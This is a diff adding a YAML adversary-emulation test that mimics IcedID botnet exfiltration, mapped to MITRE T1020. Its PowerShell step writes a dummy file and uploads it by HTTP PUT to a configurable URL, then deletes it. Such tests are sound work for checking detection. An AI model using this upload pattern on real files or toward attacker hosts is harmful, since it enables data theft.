@@ -1,0 +1,36 @@
+api_version: "2.0"
+name: IcedID Botnet HTTP PUT
+description: |-
+    Creates a text file
+    Tries to upload to a server via HTTP PUT method with ContentType Header
+    Deletes a created file
+args:
+    - name: domain
+      type: url
+      default: https://google.com
+    - name: file
+      type: string
+      default: C:\temp\T1020_exfilFile.txt
+uuid: 9c780d3d-3a14-4278-8ee5-faaeb2ccfbe0
+mitre:
+    tactics:
+        - 'TA0010: Exfiltration'
+    techniques:
+        - 'T1020: Automated Exfiltration'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: icedid-botnet-http-put
+      inline: |-
+        $fileName = "{{.Args.file}}"
+        $url = "{{.Args.domain}}"
+        $file = New-Item -Force $fileName -Value "This is ART IcedID Botnet Exfil Test"
+        $contentType = "application/octet-stream"
+        try {Invoke-WebRequest -Uri $url -Method Put -ContentType $contentType -InFile $fileName} catch{}
+      executor: powershell
+      cleanup:
+        inline: |-
+            $fileName = "{{.Args.file}}"
+            Remove-Item -Path $fileName -ErrorAction Ignore
+        executor: powershell
